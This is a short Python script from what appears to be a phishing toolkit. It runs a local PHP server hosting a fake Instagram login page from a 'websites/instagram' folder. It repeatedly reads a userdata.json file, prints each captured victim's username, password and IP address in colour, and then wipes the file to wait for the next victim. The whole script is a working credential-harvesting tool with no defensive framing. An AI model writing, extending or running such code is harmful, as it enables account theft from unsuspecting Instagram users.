import os,sys
from colorama import Fore as color 
from time import sleep
from pyngrok import ngrok,conf
from subprocess import Popen
import json
bold = '\033[1m'
endbold = '\033[0m'




stat_file = 0

def server():
    try:
        with open('server', 'w') as phpserver:
            Popen(('php','-S', 'localhost:8080','-t',"websites/instagram"), stderr=phpserver, stdout=phpserver)
        
        def user():  
            global stat_file
            if (str(os.stat('websites/instagram/userdata.json').st_size) != str(stat_file)):
                file = open('websites/instagram/userdata.json', 'r')
                data = file.read()
                file.close()
                try:
                    infor = json.loads(data)
                    print(bold+color.GREEN+"\n[+] "+color.WHITE+"Username : "+color.GREEN+infor['dev']['username'])
                    print(color.GREEN+"[+] "+color.WHITE+"Passwprd : "+color.GREEN+infor['dev']['password'])
                    print(color.GREEN+"[+] "+color.WHITE+"IP-Address : "+color.GREEN+infor['dev']['ipaddress'])
                    print(color.LIGHTCYAN_EX+"\n[*] Wait For Next... (For Exit press Ctrl+ Z)"+endbold)
                    file = open('websites/instagram/userdata.json', 'w')
                    make_file_empty = file.write('')
                    file.close()

                except:
                    print(' ')

            else:
                pass
        
        while True:
            user()

    except:
        print(color.GREEN+"[+] Mabye Port '8080' already in use \n type 'kill -9 php' in terminal...")
        print(color.RED+"[-] Something Went Wrong...")
        sleep(1)
        sys.exit()


